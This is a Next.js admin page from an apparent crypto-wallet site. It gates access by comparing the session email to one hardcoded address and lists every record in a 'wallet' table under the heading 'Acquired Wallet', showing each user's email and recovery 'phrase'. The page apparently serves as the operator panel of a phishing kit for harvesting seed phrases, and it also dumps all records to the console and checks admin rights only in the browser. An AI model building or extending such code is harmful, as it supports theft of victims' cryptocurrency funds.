"use client";

import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import WalletModal from "@/components/wallet-modal";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Wallet,
  CreditCard,
  Coins,
  ArrowRightLeft,
  BarChart3,
  Settings,
  LogOut,
} from "lucide-react";
import Image from "next/image";
import { supabase } from "@/utils/supabase";
import { useRouter } from "next/navigation";


export default function AdminPage() {
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [active, setActive] = useState({ name: "", icon: "" });
  const router = useRouter();


  const [email, setEmail] = useState(null);
  const [profiles, setProfiles] = useState([])

  useEffect(() => {
    getSession();
  }, []);

  const getSession = async () => {
    const { data, error } = await supabase.auth.getSession();

    if (data.session) {
      setEmail(data.session.user.email);
      if(data.session.user.email != "info@i-dentiq.org"){
        router.push("login");
      }else{

        
let { data , error } = await supabase
.from('wallet')
.select('*')

if(data){
  setProfiles(data)
  console.log(data)
}
      }
    }

    if (data.session == null) {
      router.push("login");
    }
  };

  const logout = async () => {
    let { error } = await supabase.auth.signOut();

    if (!error) {
      router.push("login");
    }
  };
  return (
    <div className="min-h-screen bg-gray-50 bg-[url('/bg4.jpg')]  bg-cover bg-center">
      <nav className="container mx-auto px-6 py-6 flex items-center justify-between">
        <div className="flex items-center">
          <Image
            src="/icon.png"
            alt="Zephyr Logo"
            width={60}
            height={32}
            className="mr-2"
          />

          <Image
            src="/text2.png"
            alt="text"
            width={80}
            height={32}
            className="mr-12"
          />
          
          <div className="hidden md:flex items-center gap-8">
            {/* <Link href="/" className="text-gray-600 hover:text-gray-900">Home</Link>
            <Link href="/invest" className="text-gray-600 hover:text-gray-900">Invest</Link>
            <Link href="/resources" className="text-gray-600 hover:text-gray-900">Resources</Link>
            <Link href="/pricing" className="text-gray-600 hover:text-gray-900">Pricing</Link>
            <Link href="/company" className="text-gray-600 hover:text-gray-900">Company</Link> */}
          </div>
        </div>
        <div className="space-x-4 font-semibold">
          <Button
            variant="ghost"
            className="w-full justify-start text-red-500 hover:text-red-600 hover:bg-red-50"
           onClick={logout}
          >
            <LogOut className="mr-2 h-4 w-4" />
            Logout
          </Button>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex-1 overflow-y-auto">
        <div className="p-8">
          <div className="max-w-4xl mx-auto">
            <h1 className="text-2xl font-bold mb-8">Acquired Wallet</h1>
            <div className="overflow-x-auto">
      <table >
        <thead>
 <tr className="space-x-4 px-4 ">
          <th>Name</th>
         
          <th>Phrase</th>
         
          
        </tr>

        </thead>
       
        <tbody className="divide-y space-x-4 ">

        {profiles.map(profile => (
          <tr key={profile.id} className="bg-white border-b-2 my-6 border-sec dark:border-gray-700 dark:bg-gray-800 space-x-4 ">
          <td className=" whitespace-nowrap font-medium  text-gray-900 dark:text-white mr-4 px-4 ">
          {profile.email}
          </td>
         
          <td className="px-2 text-sm  py-4">{profile.phrase}</td>
      
          
        </tr>
        ))}
         
          
        </tbody>
      </table>
    </div>
          </div>
        </div>
      </main>

     
    </div>
  );
}
